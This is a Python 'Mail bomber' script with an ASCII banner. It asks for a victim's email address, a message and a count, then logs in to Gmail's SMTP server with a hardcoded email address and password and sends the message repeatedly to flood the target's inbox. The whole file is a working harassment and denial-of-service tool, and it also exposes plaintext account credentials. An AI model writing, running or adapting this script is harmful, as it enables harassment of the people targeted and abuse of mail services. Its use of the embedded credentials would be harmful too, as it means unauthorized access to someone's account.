import smtplib
import time
import os
import sys
import marshal
import requests
import zlib
import time
import requests
import mechanize
import sys
import os
os.system("clear")
blue = '\x1b[94m'
lightblue = '\x1b[94m'
red = '\x1b[91m'
white = '\x1b[97m'
green = '\x1b[93m'
green = '\x1b[1;32m'
cyan = '\x1b[96m'
end = '\x1b[0m'
yellow = '\n\n\x1b[1;93m'
os.system("clear")

N = '\033[0m'
D = '\033[90m'
W = '\033[1;37m'
B = '\033[1;34m'
R = '\033[1;31m'
G = '\033[1;32m'
P="\033[0;35m"
Y = '\033[1;33m'
C = '\033[1;36m'
print(R+"""
888b     d888  .d8888b.  888    d8P             d8888 
8888b   d8888 d88P  Y88b 888   d8P             d88888 
88888b.d88888 888    888 888  d8P             d88P888 
888Y88888P888 888        888d88K             d88P 888 
888 Y888P 888 888        8888888b   888888  d88P  888 
888  Y8P  888 888    888 888  Y88b  888888 d88P   888 
888   "   888 Y88b  d88P 888   Y88b       d8888888888 
888       888  "Y8888P"  888    Y88b     d88P     888 
                                                      
                                                      
                                                      
""")	
print(C+"\n\n\t  Delovment by MD ALAMIN CHOWFOWRY")
print(Y+"\n+++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("\n\t\t verson: 2.0.9")
print("\n\t\t Mail bomber")
print(Y+"\n+++++++++++++++++++++++++++++++++++++++++++++++++++++")


bomb_email = input(cyan+"\nEnter Victime\x1b[1;93m Email : ")
email =("mdfahim.p4455@gmail.com")
password =("44556@@@@")
message=(input(green+"\nEnter\x1b[94mMessage:"))
amount=int(input(cyan+"\nEnterTheAmount :"))
		
mail = smtplib.SMTP('smtp.gmail.com',587)
mail.ehlo()
mail.starttls()
mail.login(email,password)
print("----------------------------------------------------")
for i in range(amount):
		mail.sendmail(email,bomb_email,message)
		print(str(i+1)+"[+[+[ Mail Sent ]+]+]+")